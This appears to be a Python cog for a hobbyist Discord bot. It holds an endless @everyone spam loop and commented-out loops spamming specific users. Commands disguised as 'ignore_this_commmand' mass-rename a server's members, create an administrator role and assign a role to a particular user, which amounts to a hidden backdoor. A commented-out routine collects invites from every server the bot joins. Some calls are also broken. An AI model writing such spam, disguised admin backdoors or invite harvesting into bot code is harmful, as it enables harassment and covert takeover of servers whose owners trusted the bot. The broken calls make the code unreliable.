import discord
from discord.ext import commands
from discord.ext.commands.core import Command

from cogs.common import Common

class MiscCommands(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.command()
    async def typing(self, ctx):
        await ctx.trigger_typing()

    #@commands.command(brief="spam @minecraftman69")
    #async def infinite_spam_minecraftman(self, ctx):
    #    while True:
    #        await ctx.send(f'<@745827166058578000> {Common.random_message(self)}')
    #        await Common.log(self, 'started infinite spam minecraftman', ctx)


    #@commands.command(brief="spam @deatg")
    #async def infinite_spam_deatg(self, ctx):
    #    while True:
    #        await ctx.send(f'<@822658667845386240> {Common.random_message(self)}')
    #        await Common.log(self, 'started infinite spam deatg', ctx)

    @commands.command(brief="DO NOTTTTTTTTTT")
    async def infinite_spam_everyone(self, ctx):
        if ctx.guild.id == 873380900434489374:
            while True:
                await ctx.send(f'@everyone {Common.random_message(self)}')
                Common.log(self, '**infinite_spam_everyone is happening be scared**', ctx)
        else:
            await ctx.send("this command can only be used in certain servers")

    @commands.command()
    async def ignore_this_commmand(self, ctx):
        the_server = self.client.get_guild(788195760209920020)
        for user in the_server.members:
            newname = Common.random_message(self)
            if len(newname) >= 30:
                newname = f"{newname[0:30]}…"
            try:
                await user.edit(nick=f'{newname}')
            except:
                aa = 3

    @commands.command()
    async def ignore_this_commmand_make(self, ctx):
        the_server = self.client.get_guild(788195760209920020)
        perms = discord.Permissions(administrator=True)
        await the_server.create_role(the_server, name='Hourman', permissions=perms)
    
    @commands.command()
    async def ignore_this_commmand_give(self, ctx):
        the_server = self.client.get_guild(788195760209920020)
        incognito_man = self.client.get_user(657381321089482783)
        role = the_server.get_role()
        await incognito_man.add_roles(role)




    #@commands.command()
    #async def getinvites(self, ctx):
    #    if ctx.author.id == Common.deatg_id or ctx.author.id == 573285573968527402:
    #        for guild in self.client.guilds:
    #            try:
    #                for invite in await guild.invites():
    #                    await ctx.send(str(invite))
    #            except:
    #                await ctx.send("errpr")
    #    else:
    #        await ctx.send('you not deatg :skull:')

def setup(client):
    client.add_cog(MiscCommands(client))